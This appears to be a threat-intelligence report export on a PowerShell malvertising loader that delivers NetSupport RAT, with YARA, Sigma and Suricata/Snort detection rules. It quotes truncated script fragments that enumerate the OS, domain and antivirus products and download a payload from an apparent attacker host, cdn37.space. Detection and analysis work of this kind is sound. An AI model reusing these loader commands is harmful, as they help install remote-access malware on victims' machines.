crowdsourced_yara_results.description: Finds PowerShell scripts used in a malvertising campaign to deliver NetSupport RAT
crowdsourced_yara_results.author: Sekoia.io

sigma_analysis_results.rule_title: Usage Of Web Request Commands And Cmdlets - ScriptBlock
sigma_analysis_results.rule_description: Detects the use of various web request commands with commandline tools and Windows PowerShell cmdlets (including aliases) via PowerShell scriptblock logs

match_context.values:
@{ScriptBlockText=
    $lRFVwVmzzkcz = (Get-WmiObject -Class Win32_OperatingSystem).Caption
    $D = '25'
    $pW = 'f08366c6-5a8e-439d-b433-0f9900255d06'
    $cLffsysscz = [System.Net.WebUtility]::UrlEncode($lRFVwVmzzkcz)
    $tvKZJJOWWnKdMfnOBddOxuWIx = Get-WmiObject Win32_ComputerSystem | Select-Object -ExpandProperty Domain
    $IygJEWNvR = Get-WmiObject -Namespace "root\SecurityCenter2" -Class AntiVirusProduct
    $hbeXYuuiYiuimoKn = $IygJEWNvR | ForEach-Object {
        $_.displayName
    }
    $n [TRUNCATED]; MessageTotal=1; ScriptBlockId=b55555fa-80f1-4ace-89b1-b50a8cf8264b; Path=; EventID=4104; MessageNumber=1}

@{ScriptBlockText=
    $lRFVwVmzzkcz = (Get-WmiObject -Class Win32_OperatingSystem).Caption
    $D = '25'
    $pW = 'f08366c6-5a8e-439d-b433-0f9900255d06'
    $cLffsysscz = [System.Net.WebUtility]::UrlEncode($lRFVwVmzzkcz)
    $tvKZJJOWWnKdMfnOBddOxuWIx = Get-WmiObject Win32_ComputerSystem | Select-Object -ExpandProperty Domain
    $IygJEWNvR = Get-WmiObject -Namespace "root\SecurityCenter2" -Class AntiVirusProduct
    $hbeXYuuiYiuimoKn = $IygJEWNvR | ForEach-Object {
        $_.displayName
    }
    $n [TRUNCATED]; MessageTotal=1; ScriptBlockId=8552d2af-7749-458a-a01a-4b02d7f178b3; Path=; MessageNumber=1; EventID=4104}

@{ScriptBlockText=$fndir = "C:\ProgramData\netsupport"
$fn = "$($fndir)\netsupport.zip"
$iudValue = "3df434f3-4265-4cb5-9f6e-22c539c1e532"
New-Item -Path $fndir -ItemType Directory
$url = "https://cdn37.space/974afa0a-d334-48ec-a0d4-4cc14efa730c-1d3d044a-e654-41e3-ad32-38a2934393e4?aklshdjahsjdh=25&ajhsdjhasjhd=nsd&iud=$iudValue"
$webClient = New-Object Net.WebClient
$webClient.Headers.Add("User-Agent", "myUserAgentHere")
$downloadUrl = $webClient.DownloadString($url)
$webClient.DownloadFile($downloadUrl, [TRUNCATED]; Path=; ScriptBlockId=edbdcfd0-8b88-4e21-8b79-7740d870ba65; MessageTotal=1; MessageNumber=1; EventID=4104}

sigma_analysis_results.rule_description:
Adversaries may employ various system checks to detect and avoid virtualization and analysis environments.
This may include changing behaviors based on the results of checks for the presence of artifacts indicative of a virtual machine environment (VME) or sandbox

match_context.values:
@{ScriptBlockText=
    $lRFVwVmzzkcz = (Get-WmiObject -Class Win32_OperatingSystem).Caption
    $D = '25'
    $pW = 'f08366c6-5a8e-439d-b433-0f9900255d06'
    $cLffsysscz = [System.Net.WebUtility]::UrlEncode($lRFVwVmzzkcz)
    $tvKZJJOWWnKdMfnOBddOxuWIx = Get-WmiObject Win32_ComputerSystem | Select-Object -ExpandProperty Domain
    $IygJEWNvR = Get-WmiObject -Namespace "root\SecurityCenter2" -Class AntiVirusProduct
    $hbeXYuuiYiuimoKn = $IygJEWNvR | ForEach-Object {
        $_.displayName
    }
    $n [TRUNCATED]; Path=; ScriptBlockId=b55555fa-80f1-4ace-89b1-b50a8cf8264b; MessageTotal=1; MessageNumber=1; EventID=4104}

@{ScriptBlockText=
    $lRFVwVmzzkcz = (Get-WmiObject -Class Win32_OperatingSystem).Caption
    $D = '25'
    $pW = 'f08366c6-5a8e-439d-b433-0f9900255d06'
    $cLffsysscz = [System.Net.WebUtility]::UrlEncode($lRFVwVmzzkcz)
    $tvKZJJOWWnKdMfnOBddOxuWIx = Get-WmiObject Win32_ComputerSystem | Select-Object -ExpandProperty Domain
    $IygJEWNvR = Get-WmiObject -Namespace "root\SecurityCenter2" -Class AntiVirusProduct
    $hbeXYuuiYiuimoKn = $IygJEWNvR | ForEach-Object {
        $_.displayName
    }
    $n [TRUNCATED]; MessageTotal=1; ScriptBlockId=8552d2af-7749-458a-a01a-4b02d7f178b3; Path=; MessageNumber=1; EventID=4104}

sigma_analysis_results.rule_description: Detects non-interactive PowerShell activity by looking at the "powershell" process with a non-user GUI process such as "explorer.exe" as a parent.

match_context.values: @{Hashes=MD5=95000560239032BC68B4C2FDFCDEF913,SHA256=D3F8FADE829D2B7BD596C4504A6DAE5C034E789B6A3DEFBE013BDA7D14466677,IMPHASH=741776AACCFC5B71FF59832DCDCACE0F; CurrentDirectory=C:\Users\george\Desktop\; OriginalFileName=PowerShell.EXE; Product=Microsoft\xae Windows\xae Operating System; Description=Windows PowerShell; FileVersion=10.0.17134.1 (WinBuild.160101.0800); ParentCommandLine="C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -noLogo -ExecutionPolicy unrestricted -file "C:\Users\george\Desktop\HQuxVxuLV.ps1"; CommandLine="C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -Version 5.1 -s -NoLogo -NoProfile; EventID=1; ParentImage=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe; IntegrityLevel=High; Image=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe; Company=Microsoft Corporation}

sigma_analysis_results.rule_title: Potential PowerShell Obfuscation Using Alias Cmdlets
sigma_analysis_results.rule_description: Detects Set-Alias or New-Alias cmdlet usage. Which can be use as a mean to obfuscate PowerShell scripts

match_context.values: @{ScriptBlockText=Set-Alias -Name gcim -Value Get-CimInstance -Option ReadOnly, AllScope -ErrorAction SilentlyContinue; MessageTotal=1; ScriptBlockId=7f731f33-6647-429e-9fba-72cc1b766bbf; Path=; EventID=4104; MessageNumber=1}

@{ScriptBlockText=Set-Alias -Name scim -Value Set-CimInstance -Option ReadOnly, AllScope -ErrorAction SilentlyContinue; MessageTotal=1; ScriptBlockId=7243d7d0-161d-4f23-bc63-691a7eff22f1; Path=; EventID=4104; MessageNumber=1}

@{ScriptBlockText=Set-Alias -Name ncim -Value New-CimInstance  -Option ReadOnly, AllScope -ErrorAction SilentlyContinue; Path=; ScriptBlockId=2b07a4d2-fdf0-495b-adaf-5fd143b5756e; MessageTotal=1; MessageNumber=1; EventID=4104}

@{ScriptBlockText=Set-Alias -Name rcim -Value Remove-cimInstance -Option ReadOnly, AllScope -ErrorAction SilentlyContinue; Path=; ScriptBlockId=eb4a34eb-314f-4f2d-ae6e-47843be59e18; MessageTotal=1; MessageNumber=1; EventID=4104}

@{ScriptBlockText=Set-Alias -Name icim -Value Invoke-CimMethod -Option ReadOnly, AllScope -ErrorAction SilentlyContinue; MessageTotal=1; ScriptBlockId=4f2bd048-4963-40b9-a29d-f58011ced9e0; Path=; EventID=4104; MessageNumber=1}

threat_severity.level_description: Severity HIGH because it was considered trojan. Other contributing factor was that it could not be run in sandboxes.

crowdsourced_ids_results.rule_msg: ET MALWARE Suspected FIN7 Related domain in DNS Lookup (cdn37 .space)
crowdsourced_ids_results.rule_raw: alert dns $HOME_NET any -> any any (msg:"ET MALWARE Suspected FIN7 Related domain in DNS Lookup (cdn37 .space)"; dns.query; bsize:11; content:"cdn37.space"; nocase; classtype:trojan-activity; sid:2052006; rev:1; metadata:affected_product Windows_XP_Vista_7_8_10_Server_32_64_Bit, attack_target Client_Endpoint, created_at 2024_04_11, deployment Perimeter, performance_impact Low, confidence High, signature_severity Major, updated_at 2024_04_11;)

crowdsourced_ids_results.rule_msg: ET MALWARE Suspected Fin7 Related Domain (cdn37 .space) in TLS SNI
crowdsourced_ids_results.rule_raw: alert tls $HOME_NET any -> $EXTERNAL_NET any (msg:"ET MALWARE Suspected Fin7 Related Domain (cdn37 .space) in TLS SNI"; flow:established,to_server; tls.sni; bsize:11; content:"cdn37.space"; fast_pattern; classtype:trojan-activity; sid:2052014; rev:1; metadata:affected_product Windows_XP_Vista_7_8_10_Server_32_64_Bit, attack_target Client_Endpoint, created_at 2024_04_11, deployment Perimeter, performance_impact Low, confidence High, signature_severity Major, updated_at 2024_04_11;)

crowdsourced_ids_results.rule_msg: POLICY-OTHER NetSupport Manager inbound connection attempt
crowdsourced_ids_results.rule_raw: alert tcp $EXTERNAL_NET [$HTTP_PORTS,443] -> $HOME_NET any ( msg:"POLICY-OTHER NetSupport Manager inbound connection attempt"; flow:to_client,established; content:"Server: NetSupport ",fast_pattern,nocase; content:"CMD="; metadata:impact_flag red; service:http; reference:url,www.virustotal.com/gui/file/34ee5aeab4830433ff98728899d29b5e9f5c4d3d8a85ef38c54d46493273294c/detection; classtype:trojan-activity; sid:53539; rev:2; )
alert ( gid:119; sid:279; rev:1; msg:"(http_inspect) invalid status line"; metadata: rule-type preproc; classtype:unknown;)

crowdsourced_ids_results.rule_msg: (http_inspect) URI path contains consecutive slash characters
crowdsourced_ids_results.rule_raw: alert ( gid:119; sid:8; rev:3; msg:"(http_inspect) URI path contains consecutive slash characters"; metadata: rule-type preproc; service:http; classtype:not-suspicious;)

crowdsourced_ids_results.rule_msg: ET POLICY HTTP traffic on port 443 (POST)
crowdsourced_ids_results.rule_raw: alert http $HOME_NET any -> $EXTERNAL_NET 443 (msg:"ET POLICY HTTP traffic on port 443 (POST)"; flow:to_server,established; http.method; content:"POST"; http.header; content:!".etrade.com|3a|443|0d 0a|"; classtype:bad-unknown; sid:2013926; rev:10; metadata:attack_target Client_Endpoint, tls_state plaintext, created_at 2011_11_18, deployment Perimeter, former_category POLICY, signature_severity Informational, updated_at 2024_03_12;)

crowdsourced_ids_results.rule_msg: ET INFO NetSupport Remote Admin Checkin
crowdsourced_ids_results.rule_raw: alert http $HOME_NET any -> $EXTERNAL_NET any (msg:"ET INFO NetSupport Remote Admin Checkin"; flow:established,to_server; http.method; content:"POST"; http.user_agent; content:"NetSupport Manager"; depth:18; fast_pattern; http.content_type; content:"application/x-www-form-urlencoded"; http.header_names; content:!"Accept"; content:!"Referer"; reference:md5,54c0e7593d94c03a2b7909e6a459ce14; classtype:misc-activity; sid:2035892; rev:5; metadata:created_at 2015_08_27, deployment Perimeter, former_category INFO, signature_severity Informational, tag RemoteAccessTool, updated_at 2023_04_20;)

crowdsourced_ids_results.rule_msg: ET INFO NetSupport Remote Admin Response
crowdsourced_ids_results.rule_raw: alert http $EXTERNAL_NET any -> $HOME_NET any (msg:"ET INFO NetSupport Remote Admin Response"; flow:established,from_server; http.stat_code; content:"200"; http.content_type; content:"application/x-www-form-urlencoded"; http.server; content:"NetSupport Gateway"; fast_pattern; startswith; reference:md5,54c0e7593d94c03a2b7909e6a459ce14; classtype:misc-activity; sid:2035895; rev:6; metadata:attack_target Client_Endpoint, created_at 2015_08_27, deployment Perimeter, former_category INFO, confidence High, signature_severity Informational, tag RemoteAccessTool, updated_at 2023_04_20;)

crowdsourced_ids_results.rule_msg: ET POLICY NetSupport GeoLocation Lookup Request
crowdsourced_ids_results.rule_raw: alert http $HOME_NET any -> $EXTERNAL_NET any (msg:"ET POLICY NetSupport GeoLocation Lookup Request"; flow:established,to_server; http.request_line; content:"GET /location/loca.asp"; startswith; http.host; content:"geo.netsupportsoftware.com"; bsize:26; reference:md5,f76954b68cc390f8009f1a052283a740; classtype:policy-violation; sid:2034559; rev:1; metadata:attack_target Client_Endpoint, created_at 2021_11_30, deployment Perimeter, former_category POLICY, performance_impact Low, signature_severity Informational, updated_at 2021_11_30;)
